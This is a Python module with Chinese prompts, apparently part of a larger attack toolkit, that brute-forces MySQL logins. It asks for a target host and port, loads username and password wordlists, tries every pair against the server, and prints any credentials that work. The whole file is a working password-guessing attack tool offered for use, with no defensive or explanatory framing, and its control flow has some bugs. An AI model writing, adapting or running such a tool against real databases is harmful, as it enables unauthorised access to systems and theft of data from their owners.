import pymysql,os
import IGM
class connection_mysql:        #mysql爆破
    def __init__(self) -> None:
        pass
    
    def mysql_options(self):
        self.host="127.0.0.1"
        self.port=3306
        self.host = input("输入MySQL主机地址(默认为127.0.0.1) or 返回菜单（输入'exit'即可）:")
        if self.host.lower() == 'exit':
            IGM.main()
        else:
            self.port = input("输入MySQL端口号(默认为3306) or 返回上一个选项框（输入'exit'即可）:")
            if self.port.lower() == 'exit':
                self.mysql_options()
    
    def mysql_burp(self):
        for username in self.usernames:  
            username = username.strip()  # 去除行尾的换行符  
            for password in self.passwords:  
                password = password.strip()  # 去除行尾的换行符  
                try:  
                    pymysql.connect(host=self.host, port=self.port, user=username, password=password)  
                    print(f"\033[32m爆破成功!!! MySQL IP地址:{self.host}:{self.port} 用户名:{username} 密码:{password}\033[0m")  
                    self.run_all()  
                except ConnectionRefusedError:  
                    print("连接目标计算机被拒绝,已退出")  
                    return  
                except pymysql.err.OperationalError as ex:  
                    print(f"\033[31m连接错误: {repr(ex)}\033[0m")  
                except Exception as e:  
                    print(f"\033[31m未知错误: {repr(e)}\033[0m")   

    def check_username(self):
        self.selection = input("\033[32m请选择MySQL用户名字典路径\033[0m\n1) 列出可使用的工具自带字典\n2) 自定义字典路径\n3) 重新选择\n4) 退出该功能模块\n请选择：")
        if self.selection == '1':
            username_list = os.listdir("./Dict/Username")
            array = []     #定义一个列表
            index = 0      #用于统计字典数量的值，从0开始计数
            for item in username_list:
                array.append(item)
                print(index, ":", item)
                index += 1           
            index = input("选择一个用户名字典 or 返回上一个选项框(输入'exit'即可)：")
            if index.lower() == 'exit':
                print("\033[31m返回成功\033[0m")
                self.check_username()
            elif index == index:        #如何把输入的值对应为index的递增值，也就是为1时，拿去1的文件路径
                a=int(index)
                self.username_path = array[a]    
                print(f"您选用了{self.username_path}字典")
                with open(f'./Dict/Username/{self.username_path}') as usernames_file:  
                        self.usernames = usernames_file.readlines() 
        elif self.selection == '2':
            while True:
                self.username_path = input("用户名字典文件路径(绝对路径) or 返回上一个选项框(输入'exit'即可):")
                if self.username_path.lower() == 'exit':
                    print("\033[31m返回成功\033[0m")
                    self.check_username()
                elif os.path.isfile(self.username_path):  
                    print(f"您选用了{self.username_path}字典")
                    with open(self.username_path) as usernames_file:  
                        self.usernames = usernames_file.readlines() 
                    break 
                else:    
                    print(f"\033[31m文件路径不正确或文件不存在，请重新输入！！！\033[0m")
        elif self.selection == '3':
            print("\033[31m返回成功\033[0m")
            self.mysql_options()
        elif self.selection == '4':
            IGM.main()
    
    def check_pass(self):
        selection2 = input("\033[32m输入MySQL密码字典路径\033[0m\n1) 列出可使用的工具自带字典\n2) 自定义字典路径\n3) 返回上一个选项框\n4) 退出该功能模块\n请选择：")
        if selection2 == '1':
            pass_list = os.listdir("./Dict/Password")
            array = []
            index = 0
            for item in pass_list:
                array.append(item)
                print(index, ":", item)
                index += 1
            index = input("选择一个密码字典 or 返回上一个选项框（输入'exit'即可）:")
            if index.lower() == 'exit':
                print("\033[31m返回成功\033[0m")
                self.check_username()
            elif index == index:
                a=int(index)
                self.password_path = array[a]
                print(f"您选用了{self.password_path}字典")
                with open(f'./Dict/Password/{self.password_path}') as passwords_file:   
                        self.passwords = passwords_file.readlines() 
        elif selection2 == '2': 
            while True:
                self.password_path = input("密码字典文件路径(绝对路径):")
                if os.path.isfile(self.password_path):  
                    print(f"您选用了{self.password_path}字典")
                    with open(self.password_path) as passwords_file:   
                        self.passwords = passwords_file.readlines()  
                    break 
                else:    
                    print(f"\033[31m文件路径不正确或文件不存在，请重新输入！！！\033[0m")
        elif selection2 == '3':
            print("\033[31m返回成功\033[0m")
            self.check_username()
        elif selection2 == '4':
            IGM.main()
        self.mysql_burp()    

    def run_all(self):
        self.mysql_options()
        self.check_username()
        self.check_pass()